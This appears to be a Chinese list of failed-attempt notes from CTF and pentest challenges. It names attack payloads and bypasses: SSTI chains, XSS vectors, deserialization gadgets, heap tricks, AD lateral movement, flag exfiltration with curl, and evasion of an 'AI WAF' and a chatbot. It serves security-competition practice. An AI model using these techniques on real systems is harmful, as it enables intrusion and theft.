+试图把 JWT 整个 jwtKey 字典爆破 → 失败：字典太大，限定 2 字符才 3844 次可接受
+试图去掉整个 X-User 头注入 → 失败：服务端拿到默认值，必须让 X-User 被识别为 hop-by-hop 丢弃
+试图直接套 mt19937 predict 库还原 → 失败：本题是 LLL 矩阵解非简单种子
+试图走 System 走 write 替代 fake_io → 失败：GLIBC 2.35+ 必须 _IO_wfile_jumps 才有 ORW
+试图单 @type 触发 JsonGenerationException → 失败：必须双 @type 链式缓存 UTF8JsonGenerator
+试图用 FileOutputStream 直接写 → 失败：1.2.80 黑名单禁了，应用自定义 FilterFileOutputStream 才行
+试图 hook 整个 libre0.so → 失败：必须精确 hook XXTEA 函数 +0x184C 偏移
+试图直接 ssh weakpass 登入 → 失败：ssh log 给的是 attacker 已成功过的入口，不是当前密码
+试图 zip 全部字典爆破 → 失败：注释提示 d{3} 三位数字缩短字典
+试图手写 MD5 碰撞 → 失败：fastcoll_v1.0.0.5.exe 是最简方案
+试图用 {{ ''.__class__.__mro__[1].__subclasses__()[80] }} 直注入 → 失败：黑名单包含 __class__ 子串造成渲染阻断
+试图读 flag 文件名 → 失败：黑名单 'flag' 子串，改用 'flagf149' 文件名
+试图直接 union select → 失败：服务端 sqlmap 检测，建议上 tamper=space2comment
+直接 SSTI 跑命令 → 失败：format string 仅泄 API_KEY，需要 admin 模板才能 SSTI
+.webp 当图片分析 → 失败：头是 CAFEBABE 实际 .class
+流量按单个 batch 解 → 失败：奇偶 batch 算法不同
+直接 RSA-2048 解密 → 失败：Session Key 是 XOR 233 + LZRR 复合
+直接 kubectl exec 进 pod → 失败：PodSecurity restricted 不允许 exec
+用高权限 ServiceAccount → 失败：default SA 仅 pods.* create/delete
+NetworkPolicy 不写 podSelector → 失败：flag-sender 入向需要匹配 app label
+ResourceQuota 超 200m/100M → 失败：超过配额 pod 创建失败
+试图用 <img src=x onerror=...> → 失败：CSP nonce 限制
+试图 <iframe> → 失败：frame-src 'none
+试图 <script src=https://unpkg.com/...> → 失败：nonce 替代不被允许
+试图直接 /tmp 路径读取 → 失败：session 文件内容是序列化数组无 PHP
+试图用 php://filter → 失败：page 过滤 php/conf/.
+试图单次塞 session → 失败：PHP session_start 后立即 unlink 需 race
+试图直接拿 root → 失败：AWD 大多是低权限 www，必须走 webshell
+试图手工拼接 PHP shell → 失败：容易被 D 盾/WebShell 查杀
+试图直接 clickhouse user2 读 flag → 失败：权限不足
+试图不改 tcache_entry 直接 free_hook → 失败：缺 leak
+试图直接遍历时间 → 失败：响应有 running_time 提示
+试图在 /api/file 用 ../ 绕过 → 失败：while '../' in filename 循环过滤
+试图直接 unzip 看 schema.sql → 失败：SQL 文件不在 zip 内，是 dirsearch 扫到的暴露文件
+试图用 SQL 注入登后台 → 失败：密码明文在 schema 直接读了，注入都用不上
+试图不解密 1.exe 直接用 strings 看 → 失败：strings 找不到 XOR 35 的关联逻辑
+试图用 docker 启动 app.java → 失败：触及 fscan 邮件网关协议盲区，潦草退场
+python-1 用普通 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}} → 失败：print 关键字被禁
+php-2 直接 union select → 失败：addslashes 拦截 SELECT 关键字，大小写绕它
+php-3 cat /flag → 失败：超过 12 字符限制且 blacklist 含 cat
+php-3 less /flag → 失败：blacklist 也拦 less/more
+试图单次 font-face leak → 失败：10000+ 字符需分批，且要触发 background-image
+试图 CL.TE 单独攻击 → 失败：需 nginx + 后端特定组合才生效
+试图走 WebSocket 路径 → 失败：corCTF/Sekai 难度需 XS-Leak + RCE 双重
+反序列化直接 new w_wuw_w() 等调用 → 失败：链式触发必须 aaa=&$a->key 引用 + coos 嵌套
+SSTI 直接 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}} → 失败：'ge' 关键字黑名单
+RSA 链式试图整体解密 → 失败：必须一层一层 PKCS1_v1_5 + 拆 IP
+矩阵直接 readlines 解码 → 失败：必须按 300x300 reshape 成 numpy 矩阵后再异或
+试图直接传 ?__proto__[outputFunctionName] → 失败：Express 默认冻结 __proto__ 防 prototype pollution
+试图用 res.render('index', {settings:{...}}}) 替代 → 失败：必须从 req.query 出发证明漏洞链可达
+试图仅污染 client 选项 → 失败：outputFunctionName 是模板生成的真正入口
+试图找 __wakeup 绕过直接反序列化 → 失败：必须按 POP 链触发，不能跳过中间层
+试图 base64 不编码直接传 → 失败：题目要求 base64 后 POST
+试图 find 找 flag 后 cat → 失败：flag 文件被 SUID date -f 限制读取，需要 date 提权
+试图直接 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}} → 失败：_ . __class__ 等全被黑名单
+试图用 request/args/values 注入 → 失败：都被过滤
+试图不解压直接读 phar → 失败：必须先上传 phar 文件再触发反序列化
+试图直接 kubectl get flags → 失败：Flag CRD 必须由 operator 创建
+试图爆破 anti-bruteforce token → 失败：硬编码 'Bi$wmX4PBTQLGe%AIKPO19$ussap4w'，operator 提示 'You dont need to bruteforce
+试图直接用 {{7*7}} 测 SSTI → 失败：模板不是 Jinja2 而是 Nunjucks（Node.js）
+试图单引号 SQLi → 失败：题目用双引号闭合
+试图用 prompt 直接问 'give me the flag' → 失败：bot 限制 google 域名
+试图所有 YellowDog 编号枚举 → 失败：carolina89 是唯一特殊 ID
+试图直接 exec("id") → 失败：返回 EL1001E，需外带
+试图用 base64 编码反弹 shell → 失败：SpEL 不直接支持 exec 二次解码
+试图用 ObjectStateFormatter 替代 Json.Net → 失败：路由用 JsonConvert
+只用 ActivitySurrogateSelectorWithoutTypeCheck → 失败：RolePrincipal 仍需 bypass
+不通过 UpdateTodo 存储 payload → 失败：需要上传通道
+试图用 file:// 协议 → 失败：只允许 http(s)://
+直接提交 SVG → 失败：mpdf 不解析外部 SVG
+读 flag 文件路径 → 失败：flag 在环境变量 $FLAG
+试图单次合并所有 gems → 失败：merge_gems 溢出检查需要先 stage0
+试图只创建 1 颗 gem 通关 → 失败：每场战斗要求 health>0/hardness 比例，硬约束必须 3-4 颗 gem
+试图直接 utl_http.request → 失败：权限受限
+试图用 DBMS_XSLPROCESSOR → 失败：12c 后默认无权限
+pboot CMS 试图上传 webshell → 失败：必须走模板标签
+直接 80 端口 web → 失败：没东西，转 8000
+华夏 ERP 试 CVE-2023-... → 失败：fastjson 高版本默认拒绝 autoType
+Lumia 用户改密码 → 失败：懒了直接 PTH
+f-secure lab 等其他 impersonate token 工具 → 失败：只有 MSF incognito 能用
+CrackMapExec 默认 RDP 模块 → 失败：扫不出有效 RDP
+约束委派走非标准路径 → 失败：要先有 service ticket
+试图直接传 PHP webshell → 失败：必须 multipart 包装
+ShitMountant 类尝试读文件 → 失败：url 是 file:/// 但写权限不够
+pydash 试图覆盖 password 变量 → 失败：必须传 isAdmin
+试图直接读 smali 找 JNI 方法 → 失败：smali 被 StubApp 一代壳加密，必须 hook UC_HOOK_MEM_WRITE 抓内存数据还原 libstub.so
+试图不用字体缓存路径猜解 → 失败：必须 md5(URL) 才能算出 dompdf 缓存文件名
+试图不调 setReferences(true) 序列化 Mocha → 失败：Kryo 默认 references=false 会把对象引用全展开，反序列化时类字段对不上
+试图用 CODECOPY 自拷贝 runtime bytecode → 失败:CODECOPY 在黑名单
+试图用 CALL/CALLCODE 模拟调用返回 → 失败:CALL/CALLCODE 在黑名单
+试图用 MSTORE 存 1 字节 → 失败:MSTORE 会高位补 0,污染返回数据
+试图直接 sha256(admin) 当 secret_key → 失败:secret 与启动时间挂钩
+试图直接调 /api/cal → 失败:需要 admin session
+试图用字符串 fmt 泄 flag → 失败:fmt 在非栈上,需多次 sendline 拼字节
+题 2 试图用 __import__('os').system('ls') → 失败：os 在阻断名单
+题 2 试图用 chr/ord 拼接 → 失败：阻断名单对字符构造也生效
+题 3 试图用空字符串绕过 sha1 比较 → 失败：sha1('')!==sha1('') 等号判断
+试图直接 admin bot 触发 → 失败：bot 只接受 market_link
+试图覆盖 cookie HttpOnly → 失败：必须经 XSS 拿 access_token
+试图走普通 render_template → 失败：必须用元类链
+试图覆盖 admin password hash → 失败：Object.freeze
+试图直接 sync-xhr → 失败：feature policy 阻止
+试图覆盖 admin JWT → 失败：必须经 XSS + opener 链
+Crypto worde 试图遍历 e 找 k → 失败：e 太大无法穷举
+JWT 试图穷举 8+ 位密码 → 失败：6 位以内才能爆破
+Pickle 试图 os.system → 失败：被黑名单拦截，需 posix.system 绕过
+试图直接看 backdoor.php 文本 → 失败：被混淆，需动态调试 echo
+试图用 GET 参数 → 失败：后门只接 POST 参数 _
+试图用 symfony Process.__destruct → 失败：有 __wakeup 限制
+试图直接 _call('rewind') 走 BehaviorRegistry → 失败：缺中间 __toString 触发
+试图不解 WAF 直接 eval → 失败：三层 wafs 阻止
+试图直接 serialize Vuln → 失败：必须经 Echoers.__destruct 触发链
+试图用 file:///etc/passwd 直接读 → 失败：协议白名单需 .jpg/.png/.jpeg/.gif
+试图直接 ldap:// 触发 → 失败：StatisticsService 未在 canSerialize 黑名单外
+试图用普通 echo + include 经典 LFI → 失败：现代 PHP 多数 disable_functions
+试图直接 unserialize() 用户输入 → 失败：现代框架基本都禁止
+试图用 MYSQLI_OPT_LOCAL_INFILE=1 上传本地文件 → 失败：题目禁用 LOCAL INFILE
+试图直接 INTO DUMPFILE 到 /tmp/ → 失败：secure_file_priv 限定 /tmp/xxx/
+试图用 user 写 <?php system('id');?> → 失败：user 限制 6 字符且无字母数字
+试图 2 维 LLL → 失败：维度不够还原 128 维 lattice
+easy_api 试图直接走 TemplatesImpl 反序列化 → 失败：黑名单拦截 ObjectInputStream.readObject，必须走 XString.toString 链
+Node Magical Login 试图用 string 类型 checkcode → 失败：必须传对象 {length:16} 触发报错
+real_easy_node 试图直接 SSRF 到 /flag → 失败：必须先污染 EJS outputFunctionName 才能 RCE
+试图直接 nxc smb 爆破 ATMService → 失败：必须用 RunUpdate.bat 日志中的 net use 凭据
+试图用 mimikatz → 失败：必须走 rbcd + getST 票据伪造路径
+swiftmq 试图 plaintext 5672 → 失败：实际是 SSL 5671 + pika SSLOptions
+试图直接 psql 客户端连 PostgreSQL → 失败：容器内没装 psql 客户端
+试图 nmap 扫描内网 → 失败：容器内可能受限工具少
+直接容器内 /flag → 失败：必须在容器逃逸后从宿主机读 /flag
+BPF 试图直接改 map_free 函数指针 → 失败：必须先越界改 array_of_map 拿到 ops
+LFSR 试图线性代数解 → 失败：必须先用 BKZ-22 + split_master 重组 bit
+Flask MT19937 试图爆破 secret_key → 失败：必须收集 624 个 32-bit 输出恢复状态
+Flask eval 试图直接 system('id') → 失败：sandbox 限制 __builtin__ 必须逃逸
+SVG 试图直接 decode XML → 失败：unicode 4p2V 等是替换表，必须先映射
+Diophantine 试图逐步求解 → 失败：必须 20 维 LLL 一次性解
+Ssti 试图直接 {{config}} 等关键字 → 失败：必须 file= 路径可控
+试图直接 SELECT 出 flag → 失败：MySQL 用户没读 flag 权限
+general_log 注入 试图指向 .php → 失败：必须指向 EJS 模板才能渲染
+Flag1 试图走容器内 ssh 写公钥 → 失败：必须 mount-procfs 容器逃逸到宿主
+Flag2 试图直接走 LDAP 反序列化 → 失败：必须先用 RMI 反弹 shell
+Flag3 试图走 BloodHound GUI 找路径 → 失败：必须用 bloodhound-ce-python 命令行
+flag1 试图暴力破解 admin 之外的账号 → 失败：admin 123456 是经典弱口令
+flag4 试图走 PTK → 失败：必须用 PTH（pass the hash）绕过 NTLM 限制
+flag5 试图直接 SELECT flag → 失败：必须 md5(库名+xxx) 算 hash 拼接
+试图直接 phpmyadmin 写 PHP → 失败:phpmyadmin 目录权限限制
+试图单编码 %3f LFI → 失败:file_exists() 检测 %3f 解码
+试图 simpler.py -c 'bash' → 失败:simpler.py 输入过滤 & | ; -
+试图直接 RCE 提权 → 失败:www-data 无 su 权限
+试图 brute libc base 0xb7600000 → 失败:libc base 0xb75f8000 才对
+试图用 longjmp 改流程 → 失败:无 longjmp 可用
+试图直接创建 post → 失败:admin 权限校验
+试图用 fetch 读 cookie → 失败:Same-Origin Policy
+试图单字符 iframe → 失败:16 iframe 必须并行
+Web 试图直接传路由路径字符串 → 失败：regex 关键字拦截
+Crypto 试图手工解 6 元 LCG → 失败：solve4 等差数列求 N 模式没意识到
+Pwn 试图覆盖返回地址到 system → 失败：canary 未知
+试图直接 admin 登录 → 失败：必须先 ctfer 登录保持爆破
+试图用普通 md5 注入 → 失败：必须用 ffifdyop 触发 raw md5
+试图用 nmap -p- 扫全端口 → 太慢，改 rustscan --top
+试图浏览器访问 50051 → 失败：gRPC 是二进制协议无 HTTP UI
+试图 evans 交互手输密码 → 太慢，改 Python 批量破解
+试图仅看 S3 bucket → .minio.sys 在代码层保护
+试图 Windows 标准 / 分隔符 → 被过滤
+试图设 MINIO_UPDATE_MINISIGN_PUBKEY → 仍需 Admin 凭据
+试图 Struts2 S2-xxx → 走 filename 跨目录更快
+试图 Shiro 密钥破裂 → 默认密钥已知
+试图 ActiveMQ HTTP API → 必须 OpenWire 协议
+试图直接 Prophecy __call 链 → 缺 Faker 依赖
+试图 Laravel/ThinkPHP gadget → 是 EasySwoole
+试图 system 直接回显 → Swoole 不支持
+试图直接改 webhook → 鉴权拒
+试图 SSRF 内网探测全部端口 → 太多，扫 80/3306
+试图 Redis 写 SSH 公钥 → 缺 dir 切换
+试图 SQL 注入 → 仅 3306 端口代理
+试图直接 su three → one 无密码
+试图 wget 上传 so → write 权限不在 three
+试图用 Burp 自动化 id 暴破 → 失败：intruder 才是标准答案
+试图手工绕过 JWT secret → 失败：直接改 alg=none 更稳
+Wireshark 默认搜索 flag 关键字 → 失败：flag 在原始 payload 需跳指定流
+试图对单一语言直接拿 flag → 失败: 拟态表决必须三语言同时返回一致结果
+直接用 jdwp-shellifier 不挂代理 → 失败: JDWP 协议需要 socket 隧道, frp 转发才行
+试图直接拿 flag → 失败: 是靶场综合题, 必须走完整渗透链路才能拿 flag
+试图用 .import 写文件 → 失败：.import 受限
+试图直接拼 shellcode 注入 → 失败：sqlite3 不是 shell
+试图用 ATTACH 直接写 /flag → 失败：readflag 需要 token
+试图不解 DTLS 直接看 pcap → 失败：DTLS 加密
+试图用 SSLKEYLOGFILE 之外的方式 → 失败：EC 证书没法用 RSA 私钥解
+试图用普通 token 登录 → 失败：需要 ≤ 600000ms 时戳
+试图用 ysoserial 直接打 broker → 失败: broker 是中转, 不是 RCE 入口
+试图绕过 filter 用 ../ → 失败: 路径规范化在前
+试图用复杂过滤绕过 → 失败: AWD 修洞比赛速度优先
+试图单挑打 → 失败: 必须批量脚本
+试图不解 AES 直接读聊天记录 → 失败: SQL 备份里聊天记录是密文
+试图绕过 XSS 过滤 → 失败: 必须用 object data:text/html;base64 绕过
+试图不解 AES 直接读聊天 → 失败: 备份 SQL 是密文
+试图不开内网穿透直连 → 失败: Electron 客户端无法直连攻击机
+试图用 <script> 直接 XSS → 失败: innerHTML 不执行 script
+试图用 onclick 绕过 → 失败: 过滤了 onclick
+原型链污染直接 console.log 验证 → 失败：必须实际触发 npm preinstall
+Proxy 用 getOwnPropertyDescriptor → 失败：get 才是陷阱
+Fastify 用强 token 验证 → 失败：hash(user.id) 无盐弱爆破
+SVG 直接用 script → 失败：innerHTML 不解析 script 但解析 SVG
+试图直接 nc reverse shell → 失败：AI WAF 拦截命令包含敏感字符串
+试图用 base64 编码 command → 失败：AI WAF 拦截长 base64
+试图只调 edit 写文件不触发 system → 失败：写完必须 system(EDITOR) 才执行
+Redis 主从复制 → 失败：redis 3 不支持
+直接写 webshell → 失败：机器没 web 服务
+试图用 mimikatz sekurlsa logonpasswords → 失败：缺 system 权限
+直接找 flag → 失败：flag 分布在多台机器，必须走完整横向
+绕过 ThinkPHP RCE 直接 webshell → 失败：题目限制走 RCE 路线
+手撕 ThinkPHP 5.0.23 → 失败：直接用现成 poc 即可
+直接 PTH 到 DC → 失败：必须先 DCSync 导出域管哈希
+url 写 captch（漏 a）→ 失败：必须 captcha
+只 ThinkPHP 不够 → 失败：flag2 在 OA 机器上必须 PMA 日志写马
+redis 写 webshell 直接读 flag1 → 失败：必须 SUID base64 间接读
+GitHub 的 redis_replication 脚本 → 失败：msf 内置模块更稳定
+直接 Docker exec 不挂载目录 → 失败：容器内看不到宿主机 flag
+试图用 mysql UDF → 失败：root 密码直接进数据库读更简单
+试图直接 %PrepareFunctionForOptimization → 失败：diff 把该 intrinsic 屏蔽了
+试图用 ArrayBuffer.transfer() detach → 失败：diff 把除 %ArrayBufferDetach 外的 detach 路径全屏蔽
+试图跑发行版 V8 → 失败：必须用 diff 后编译的 d8 二进制
+试图用 Mojo Python binding → 失败：题目改的是 C++ blink 内部 Mojo
+试图跳过 CookAndEat 直接拿 FoodInterface Ptr → 失败：必须通过 CreatePerson 才能拿
+试图利用 PersonInterface getter → 失败：getter 不触发引用计数 UAF
+试图直接读 flag.php → 失败：跨目录且不在白名单
+试图用 gopher:// 协议 → 失败：curl 默认不允许
+试图用 @ 符号绕 host → 失败：parse_url 解析正确
+试图伪造任意 cookie 内容 → 失败：padding oracle 仅能解特定密文
+试图用新版 Node.js 漏洞 → 失败：题目锁定 8 版本
+试图直接调 /C00mmmmanD → 失败：IP 不在白名单
+试图用 Shiro 反序列化 → 失败：环境是 fastjson 不是 Shiro
+试图用 ysoserial 原始 CC 链 → 失败：反序列化点是 PHP gadget 不是 Java
+试图直接触发 system → 失败：触发点需要走 OpisClosure 包装
+试图 curl -d @/flag 外带 → 失败：curl 命令被 ban
+试图直接 Runtime.exec("bash -i") → 失败：反弹 shell 端口被 ban
+试图用 CC1/CC6 链 → 失败：本题要求 CC4 (TrAXFilter)
+直接 cat /flag 读文件 → 失败：web 1 是 php://filter 不是命令执行
+直接 phar:// 解析上传的 phar → 失败：服务端验签名 hash，必须改 3:{→4:{ + 重算 sha1
+mypdf invite 写 0/null → 失败：必须 -3.3e99999999999999 才能触发 JSON fallback
+直接上传 evil.so 到 /tmp → 失败：必须经 web 请求 env=LD_PRELOAD=... 才加载
+Java 序列化为标准 ObjectOutputStream → 失败：服务端是 Hessian2 反序列化协议
+固件直接 try all-zeros 试错 → 失败：1024 位全猜需 2^1024 不可行，必须逐位时间侧信道
+直接 CSP 头绕不过 → 失败：必须 max_input_vars=1000 触发 PHP Warning
+mypdf invite=-3.3e99999999999999 直接绕过 admin → 失败：注册步骤需先 m1xian_a 替换
+fileupload 单纯上传 .xml → 失败：必须路径穿越到上级 webapps 目录
+SSRF 直接 gopher://127.0.0.1:80/ → 失败：需 SQL 注入写入 DB + click 跳转
+Flask password 全 36 字符爆破 → 失败：results[0:short] 逐位爆更省力
+PHP 反序列化简单走 __destruct → 失败：必须走 SSTI + Redis RESP 三件套
+直接 SplFileObject('/flag') → 失败：必须 php://filter/read=convert.base64-encode 链
+md5_ata 字符串碰撞 → 失败：必须用二进制字节碰撞（M%C9h...）
+preg_match 替换字符 → 失败：必须用通配符绕过
+直接 ThinkPHP form_id=phpinfo() → 失败：必须 system() 才能 RCE
+直接上传 1.php 不过 → 失败：必须先 Config 改 file_type 白名单加 php
+SQLServer 直接 sa 爆破 → 失败：本题是弱口令配置
+ADCS ESC1 直接申请证书 → 失败：必须模版允许低权限用户指定 SAN
+vCenter 直接 Web 登录 → 失败：必须 cookie 伪造 + Log4j 打
+试图单 User 类触发 → 失败：缺 __call 跳转
+试图对 c1/e1 用 Wiener → 失败：e 太大
+fmt 直接读 stdout 字符串 → 失败：输出未打印
+签到直接 ctf flag{} 搜 → 失败：藏在 page source 注释
+SSTI 直接 {{7*7}} → 失败：被黑名单过滤
+phar 试图用 file:// → 失败：phar:// 才触发
+upload_100 直接上传 .php → 失败：后缀过滤
+.htaccess 不设 multibyte 直接写 PHP → 失败：UTF-7 编码不被识别
+pop_200 直接 unserialize User → 失败：缺魔术方法触发链
+PHP filter 直接读 flag.php → 失败：单次读不出全部
+匿名类直接 system → 失败：没找到正确命名
+disable_function 用 LD_PRELOAD → 失败：被 ban
+试图直接 addcomputer 创建机器账户 → 失败：MAQ=0
+试图走 nopac 直接 SamAccountName 改名 → 失败：XR-Desktop 无 WriteDacl
+试图找 CVE-2019-1040 替代路径 → 失败：环境无该漏洞
+试图用 SSH 私钥直接打 DC → 失败：Linux 主机无域凭据
+用 'cat /flag' → 失败：关键词黑名单过滤
+用 ?cmd=cat /flag → 失败：? 也被过滤
+用双写 catcat → 失败：只替换一次仍可能命中
+关卡2 直接 'or 1# → 失败：' 被过滤
+试图用 <img onerror=...> SSTI → 失败：被黑名单拦
+试图不解密直接读 .pyc → 失败：flag 藏在隐写段
+试图走 ROP chain 直接 system → 失败：无合适 gadget 链
+试图 leak __malloc_hook → 失败：libc-2.27 改用 __free_hook 更稳
+试图解 ECC 用大素数 Pollard rho → 失败：p=127 直接枚举 d 更快
+试图不解码 emoji 直接读 flag → 失败：flag 藏在替换结果
+试图 union select 直接出数据 → 失败：WAF 拦 union
+试图用注释 -- 替换 /**/ → 失败：服务端解析失效
+试图用普通 Next.js POC → 失败：CVE-2025-55182 需 multipart form-data
+试图用 ThinkPHP 默认 {if} 模板 → 失败：{args|func} 写法才通
+试图 ms=1'' 报错注入 → 失败: 报错被抑制只能 union
+试图用 file:// 协议读文件 → 失败: 必须用 glob:// 走 DirectoryIterator
+试图绕 .htaccess 黑名单 → 失败: 直接上传 .htaccess 改解析更高效
+试图用回显 XXE 读 flag → 失败: 必须 OOB 外带
+试图 Login 题用密码爆破 → 失败: 默认密码 1q2w3e4r
+试图 babyre part4 用 Python 暴力 → 失败: Python 太慢, 必须 C
+试图用回显 XXE → 失败: 必须 OOB 外带
+试图覆盖 __free_hook → 失败: glibc 2.31 已无 hook
+试图爆破 5 字符压缩包密码 → 失败: 改用 bkcrack 已知明文
+试图用 prettier 默认 parser → 失败：必须自定义才能触发 require
+试图直接对密文 XXTEA → 失败：缺密码
+试图用 __reduce__ 简单 pickle → 失败：环境过滤关键字
+试图用 jinja2 sandbox 逃逸 → 失败：直接走 constructor
+试图直接 gcd(a, b) → 失败：必须先减去 e 再算
+试图直接 php://input LD_PRELOAD → 失败：必须经 POP 链触发 putenv
+试图不爆破 k 直接解 ezecc → 失败：k 私钥 < 1e6 是必爆点
+试图不打 HNP 格直接对 DSA 暴力 → 失败：DSA 8 次签名同 nonce 必须 HNP
+直接从外网 nmap 扫 → 失败：仅主机模式需先登入跳板
+sqlmap 用 random user-agent → 失败：WAF 拦截
+尝试 john 爆破 SSH 私钥 passphrase → 失败：AES 私钥需要先解对称加密
+试图注册新账号 → 失败：cookie 加密需 ADMIN_PASSWORD
+试图爆破 IV 32 字节 → 失败：iv 长度正确但缺 key
+试图在 v4 上重置 → 失败：v4 没有详细 reset 端点
+试图用 6 位 PIN 爆破 → 失败：题目是 4 位
+dynamic_matrix_traversal 试图用 BFS 求路径 → 失败：题目要求 execute 两次而非单次，DP 公式固定
+swap 试图走正常 flash loan → 失败：flash 99 vs 101 利用整数计算差异，不是单纯套利
+Subset 试图用整数线性规划 ILP → 失败：题目只接受 0/1 数组，必须 brute force 子集
+试图破解 admin 密码 → 失败：admin 是 james 之外的另一个密码
+试图在用户层找 flag → 失败：flag 在 root，需要 cron 域名劫持
+flask SECRET_KEY 全字符爆破 → 失败：实际只有 4 字符 hex
+Pickle 直接用 'os' 字段 → 失败：黑名单过滤 'builtin'/'os'/'bytes'/'R'/'i'/'o'/'b
+TEA 标准 delta → 失败：魔改 delta=0x67452301
+试图从栈布局推断 canary 后面直接是 ebp+返回地址 → 失败：实际 canary 后 4 个地址才是返回地址，需要爆破最后一字节
+试图单次 payload 直接 ret2system → 失败：canary 检测 + 栈布局异常必须二次执行
+SecDisk 直接 mount → 失败：未爆破密码，mount 失败
+fmtstr_payload 偏移从 6 起 → 失败：amd64 前 6 个 reg + 8 字节 retaddr，偏移 8
+覆盖 __free_hook → 失败：glibc 2.34+ 已移除 hook
+myZoo 直接 ret2libc → 失败：栈位置低，需要栈迁移
+ez_java 用 CVE PoC 直连 → 失败：需要 uploads 前缀绕路径白名单
+tar entry 检查 content 包含 '..' → 失败：检查在文件内容而非 entry name
+ezDjango 直接 pickle 反序列化 → 失败：需要在 ssti 中触发 copy_file 写 cache
+LCG 整段反推 → 失败：复杂度爆炸，单块已知 8 字节可解
+Blind SSTI 用直接回显 → 失败：题目无回显，只能时延判 RCE
+N-RustPICA 直接 RSA 解密 → 失败：d 太大穷举不可行，e/N^6 连分数才行
+五子棋协议当 WebSocket → 失败：自定义 binary 协议，Magic=0x47414D45
+试图直接走 4869 隐藏菜单 → 失败：magic < 0x1305 未初始化
+BigI 用逆序 + 单变量解 → 失败：128 进制 + 多轮混合操作需符号执行
+CrackMe 直接爆破 32 字节 → 失败：2^256 不可能
+试图用 Python zlib 反汇编 pyc → 失败：必须用 marshal + dis
+智能合约用 attack-vector 重入 → 失败：vault 是 non-reentrant
+试图用 eval("require('child_process').execSync(...)") → 失败：--disallow-code-generation-from-strings 直接抛 EvalError
+试图用 Object.assign/Reflect.getPrototypeOf 绕 proto 链 → 失败：--disable-proto=delete 阻止 __proto__ 删除
+试图直接 mmap 覆盖 exit_lists → 失败：bdev->vqs 数组本身不可写，只能通过 virtio_pci__data_out 间接注入
+试图用 ROP gadget chain 完整劫持 RIP → 失败：lkvm 没暴露传统栈溢出，必须走 JOP
+log4j 直接弹计算器 → 失败：必须 marshalsec 中转
+Apache 2.4.49 试 GET /etc/passwd → 失败：要 mod_cgi
+RSA 试 Pollard rho → 失败：p/q 太接近用 Fermat
+试图用 setuid() 改 euid → 失败:非 root 进程 setuid(0) 会被 capability 拒绝
+试图在 SetUID 后再 open private_data.bin → 失败:open 时受 euid 检查
+试图在 RestrictedUnpickler 用 c__main__\neval → 失败：eval 在黑名单
+试图 c__main__\nopen → 失败：open 同样被禁
+试图直接 s (dict set) 注入 __class__ → 失败：栈机模型不匹配
+试图直接用 #{} 写 process.cwd() 测试 → 失败：sandbox 默认禁 global 属性访问
+试图覆盖 __free_hook → 失败：libc-2.30 已移除 hook
+EzQl 试图直接 Runtime.exec → 失败：QLExpress 默认禁止，必须走 JdbcRowSetImpl.dataSourceName setter
+K-Cessation 试图直接 RSA 解密 → 失败：必须解 64 位转轮 wheel + LLL 攻 p,q
+RustAndroid 试图直接调 Rust crate → 失败：必须分析密钥流 + S-box 浮动爆破
+试图直接栈溢出 → 失败:有 canary 保护
+试图用 size=0 → 失败:0 字节读不到内容
+试图发件人伪造 → 失败:SMTP 严格校验发件人
+试图单 Agent 跑全部 → 失败:单 Agent 上下文不够
+试图不用 MCP 串工具 → 失败:每个 Agent 必须独立 MCP 隔离
+试图用 GPT-4 → 失败:CTF 渗透场景 GPT-4 弱于 GLM5
+试图传 system(''cat /flag'') → 失败: 题目问函数名不是拿 flag
+用 utf-8 直接解乱码 → 失败: 双重编码, 必须 latin1→bytes→utf-8 反向
+试图单属性 transition → 失败：必须 4 属性才有足够缓存空间
+试图静态改 v8 源码 → 失败：必须 d8 调试
+直接 shellcode 写 → 失败：必须先获 PropertyArray r/w
+试图不读源码硬猜 _rmtree_unsafe 漏洞 → 失败：必须知道 PyInstaller 历史漏洞细节
+试图用普通 mkdir 替换 → 失败：不是 symlink 不触发 TOCTOU
+试图高频 race → 失败：3 次机会限制时间不够
+Crypto 试 fer factor n → 失败：n 未知，只给 h,p,c
+Crypto 用 Wiener's attack → 失败：e 不是连续分数小值
+PWN 直接溢出不泄 canary → 失败：栈保护开 canary
+PWN 跳过 fmtstr 直接盲溢 → 失败：盲溢打不开 canary
+试图 union 注入 web 签到 → 失败：MIME+skip 中间件拦
+试图不开 fuzz 静态分析 klang → 失败：类型系统复杂
